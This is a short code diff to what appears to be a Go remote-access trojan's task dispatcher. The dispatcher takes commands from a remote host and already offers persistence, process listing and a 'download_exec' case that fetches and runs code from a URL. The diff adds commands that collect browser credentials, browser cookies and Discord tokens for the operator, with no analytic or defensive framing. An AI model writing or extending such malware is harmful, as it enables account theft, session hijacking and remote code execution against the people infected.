@@ -593,6 +593,12 @@ func runTask(tID, command, argsJSON, host, port string, useTLS bool, hwid string
 		out = "persist ok"
 	case "get_processes", "process_list":
 		out, code = processList()
+	case "credentials", "browser_credentials":
+		out = collectCredentials()
+	case "cookies", "browser_cookies":
+		out = collectCookies()
+	case "discord", "discord_tokens":
+		out = collectDiscord()
 	case "download_exec":
 		u := argStr(args, "url", "URL")
 		if u == "" {
